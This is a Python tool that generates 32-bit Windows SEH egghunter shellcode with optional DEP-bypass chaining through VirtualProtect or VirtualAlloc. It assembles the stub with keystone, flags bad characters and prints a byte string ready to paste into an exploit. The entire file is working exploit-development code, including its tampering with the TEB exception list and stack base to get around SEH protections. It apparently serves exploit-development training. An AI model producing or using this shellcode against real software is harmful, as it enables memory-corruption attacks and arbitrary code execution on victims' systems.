#!/usr/bin/env python3
import argparse
import sys

try:
    import keystone as ks
except ImportError:
    print("[!] Please install keystone-engine: pip install keystone-engine")
    sys.exit(1)


class Color:
    def __init__(self, disabled=False):
        if disabled:
            self.red = self.green = self.yellow = self.blue = ""
            self.reset = ""
        else:
            self.red = "\033[31m"
            self.green = "\033[32m"
            self.yellow = "\033[33m"
            self.blue = "\033[34m"
            self.reset = "\033[0m"


def ensure_4byte_tag(tag):
    if len(tag) != 4:
        print("[!] Egg tag must be exactly 4 bytes. Using 'w00t' as fallback.")
        return "w00t"
    return tag


def assemble_getsize(depsize, sizereg="ebx"):
    lines = []
    reginfo = {
        "ecx": ["ecx", "cl", "ch"],
        "ebx": ["ebx", "bl", "bh"],
    }
    if sizereg not in reginfo:
        raise ValueError("Unsupported sizereg: %s" % sizereg)

    if depsize <= 127:
        lines.append("    push 0x%02x" % depsize)

    else:
        sizebytes = "%04x" % depsize
        low = sizebytes[2:4]
        high = sizebytes[0:2]

        if sizereg in ("ecx", "ebx"):
            regvars = reginfo[sizereg]
            lines.append(f"    xor {sizereg},{sizereg}")

            if low != "00" and high != "00":
                lines.append("    mov %s,0x%s" % (regvars[0], sizebytes))
            elif low != "00":
                lines.append("    mov %s,0x%s" % (regvars[1], low))
            elif high != "00":
                lines.append("    mov %s,0x%s" % (regvars[2], high))

        # if sizereg == "ebp":
        #     if low != "00" and high != "00":
        #         lines.append(f"xor {sizereg},{sizereg}\n\t")
        #         lines.append("mov bp,0x%s\n\t" % sizebytes)

        # last resort
        if not lines:
            blockcnt = 0
            vpsize = 0
            blocksize = depsize

            while blocksize > 127:
                blocksize //= 2
                blockcnt += 1

            lines.append(f"    xor {sizereg},{sizereg}")
            lines.append("    add %s,0x%02x" % (sizereg, blocksize))

            vpsize = blocksize
            depblockcnt = 0

            while depblockcnt < blockcnt:
                lines.append(f"    add {sizereg},{sizereg}")
                vpsize += vpsize
                depblockcnt += 1

            delta = depsize - vpsize
            if delta > 0:
                lines.append("    add %s,0x%02x" % (sizereg, delta))

        lines.append(f"    push {sizereg}")

    return lines


def assemble_seh_egghunter(egg_tag, depmethod=None, depreg="esi", depsize=0x300):
    tag_hex = "0x" + "".join(f"{b:02x}" for b in egg_tag.encode()[::-1])

    getpointer = None
    getsize = None
    jmp_payload = ["    jmp edi"]
    # DEP chaining
    if depmethod:
        if depreg.lower() != "esi":
            getpointer = [
                "get_api_pointer:",
                f"    mov esi, {depreg}",
            ]
        if depmethod.lower() == "virtualprotect":
            getsize = assemble_getsize(depsize)
            jmp_payload = ["    push esp", "    push 0x40"]
            jmp_payload += getsize
            jmp_payload += [
                "    push edi",
                "    push edi",
                "    push esi",
                "    ret",
            ]
        elif depmethod and depmethod.lower() == "virtualalloc":
            depsize = 0xFFF
            jmp_payload = [
                "    push 0x40",
                "    xor eax, eax",
                "    mov al, 0x10",  # move MEM_COMMIT (0x1000) into eax
                "    push eax",  # push flAllocationType
                "    push 0xffffffff",  # push dwSize to be negated
                "    pop eax",
                "    neg eax",
                "    push eax",  # push dwSize
                "    push edi",
                "    push edi",
                "    push esi",
                "    ret",
            ]

    lines = []
    if getpointer is not None:
        lines += getpointer
    lines += [
        "start:",
        "    jmp get_seh_address",
        "build_exception_record:",
        "    pop ecx",  # address of exception handler
        f"    mov eax, {tag_hex}",  # tag into eax
        "    push ecx",  # push Handler of the _EXCEPTION_REGISTRATION_RECORD structure
        "    push 0xffffffff",  # push Next of the _EXCEPTION_REGISTRATION_RECORD structure
        "    xor ebx, ebx",
        "    mov dword ptr fs:[ebx], esp",  # overwrite ExceptionList in the TEB with a pointer to our new _EXCEPTION_REGISTRATION_RECORD structure
        "bypass_stacklimits_check:",  # bypass StackBase check by placing the memory address of our _except_handler function at a higher address than the StackBase.
        "    sub ecx, 0x04",  # substract 0x04 from the pointer to exception_handler
        "    add ebx, 0x04",  # add 0x04 to ebx
        "    mov dword ptr fs:[ebx], ecx",  # overwrite the StackBase in the TEB
        "is_egg:",
        "    push 0x02",
        "    pop ecx",  # load 2 into counter
        "    mov edi, ebx",  # move memory page address into edi
        "    repe scasd",  # check for tag, if the page is invalid we trigger an exception and jump to our exception_handler function
        "    jnz loop_inc_one",  # didn't find signature, increase ebx and repeat
        "    jmp found_egg",  # found the tag
        "loop_inc_page:",
        "    or bx, 0xfff",  # if page is invalid the exception_handler will update eip to point here and we move to next page
        "loop_inc_one:",
        "    inc ebx",  # increase memory page address by a byte
        "    jmp is_egg",  # check for the tag again
        "get_seh_address:",
        "    call build_exception_record",  # call to a higher address to avoid null bytes & push return to obtain egghunter position
        "handler:",
        "    push 0x0c",
        "    pop ecx",  # store 0x0c in ecx to use as an offset
        "    mov eax, [esp+ecx]",  # mov into eax the pointer to the CONTEXT structure for our exception
        "    mov cl, 0xb8",  # mov 0xb8 into ecx which will act as an offset to the eip
        #    increase the value of eip by 0x06 in our CONTEXT so it points to the "or bx, 0xfff" instruction to increase the memory page
        "    add dword ptr ds:[eax+ecx], 0x06",
        "    pop eax",  # save return address in eax
        "    add esp, 0x10",  # increase esp to clean the stack for our call
        "    push eax",  # push return value back into the stack
        "    xor eax, eax",  # null out eax to simulate ExceptionContinueExecution return
        "    ret",
        "found_egg:",
    ]
    lines += jmp_payload

    return "\n".join(lines)


def print_asm_lines(asm_source, eng, bad_chars, no_color=False):
    colors = Color(disabled=no_color)

    lines = [l for l in asm_source.splitlines() if l.strip()]

    try:
        # try incremental mode
        asm_blocks = ""
        prev_size = 0
        full_encoding = None

        for line in lines:
            asm_blocks += line + "\n"
            encoding, count = eng.asm(asm_blocks)  # may fail for SEH
            if not encoding:
                continue
            prev_size = len(encoding)
        full_encoding = encoding  # no error → incremental mode OK

        incremental_ok = True

    except ks.KsError:
        # SEH case → must assemble full block once
        incremental_ok = False
        full_encoding, count = eng.asm(asm_source)

    # Now print per line slices
    byte_index = 0

    # Determine longest line for formatting
    max_line_len = max(len(line) for line in lines)
    col1_width = max_line_len + 6
    print(
        f"{colors.blue}{'[+] Egghunter assembly code'.ljust(col1_width)}Corresponding bytes{colors.reset}"
    )
    for line in lines:
        enc_opcode = ""

        # Assemble this single line to get its size
        # (Keystone supports isolated-line assembly even for labels)
        try:
            line_enc, _ = eng.asm(line)
            line_size = len(line_enc)
        except ks.KsError:
            # labels alone (e.g. "start:") assemble to nothing
            line_size = 0

        # Slice bytes
        current = full_encoding[byte_index : byte_index + line_size]
        byte_index += line_size

        # Color bad bytes
        for b in current:
            hb = f"{b:02x}"
            if hb in bad_chars:
                enc_opcode += f"{colors.red}0x{hb}{colors.reset} "
            else:
                enc_opcode += f"0x{hb} "

        spacer = 30 - len(line)
        print(f"{line.ljust(col1_width)}{enc_opcode}")

    # Convert bad chars to integer values
    badvals = {int(x.replace("\\x", ""), 16) for x in bad_chars}

    # Find where bad chars appear
    bad_positions = {}
    for idx, b in enumerate(full_encoding):
        if b in badvals:
            bad_positions.setdefault(b, []).append(idx)

    return full_encoding, count, bad_positions


def main():
    parser = argparse.ArgumentParser(
        description="SEH egghunter generator with DEP support"
    )
    parser.add_argument(
        "-e", "--egg", default="w00t", help="4-byte egg tag (default: w00t)"
    )
    parser.add_argument(
        "-b",
        "--bad-chars",
        default=["00"],
        help='Bad chars (space-separated hex, e.g., "00 0a")',
        nargs="+",
    )
    parser.add_argument(
        "-v",
        "--var-name",
        default="egghunter",
        help="Variable name for output (default: egghunter)",
    )
    parser.add_argument(
        "--depmethod",
        choices=["virtualprotect", "virtualalloc"],
        help="Enable DEP bypass after egg found",
    )
    parser.add_argument(
        "--depreg", default="esi", help="Register holding API address (default: esi)"
    )
    # accept decimal or hex (0x...) input
    parser.add_argument(
        "--depsize",
        type=lambda x: int(x, 0),
        default=0x1000,
        help="Size for DEP call (default: 0x1000)",
    )
    parser.add_argument("--no-color", action="store_true", help="Disable ANSI colors")

    args = parser.parse_args()

    egg = ensure_4byte_tag(args.egg)
    bad_chars_set = set(args.bad_chars)

    asm_code = assemble_seh_egghunter(
        egg, depmethod=args.depmethod, depreg=args.depreg, depsize=args.depsize
    )

    eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
    encoding, count, bad_positions = print_asm_lines(
        asm_code, eng, bad_chars_set, no_color=args.no_color
    )

    # Final output
    final = f'{args.var_name} =  b"'
    for i, byte in enumerate(encoding):
        if i % 11 == 0 and i > 0:
            final += '"\n' + f'{args.var_name} += b"'
        final += f"\\x{byte:02x}"
    final += '"'

    print()
    print(final)

    # Summary
    colors = Color(disabled=args.no_color)
    method = args.depmethod or "none"

    print()
    print(f"{colors.green}[+] egghunter created!{colors.reset}")
    print(f"[=]   len: {len(encoding)} bytes")
    print(f"[=]   tag: {egg * 2}")
    print(f"[=]   dep: {method}")

    # Check for bad chars
    if len(bad_positions) > 0:
        print()
        print(f"{colors.red}[!] Bad characters found in egghunter!{colors.reset}")
        print(f"{'Bad Char':<10}{'Positions':<25}")
        for b in sorted(bad_positions.keys()):
            positions = ", ".join(str(p) for p in bad_positions[b])
            print(f"{colors.red}0x{b:02x}{colors.reset}      {positions}")
        print()
        raise SystemExit(
            f"{colors.red}[!] Remove bad characters and try again{colors.reset}"
        )


if __name__ == "__main__":
    main()
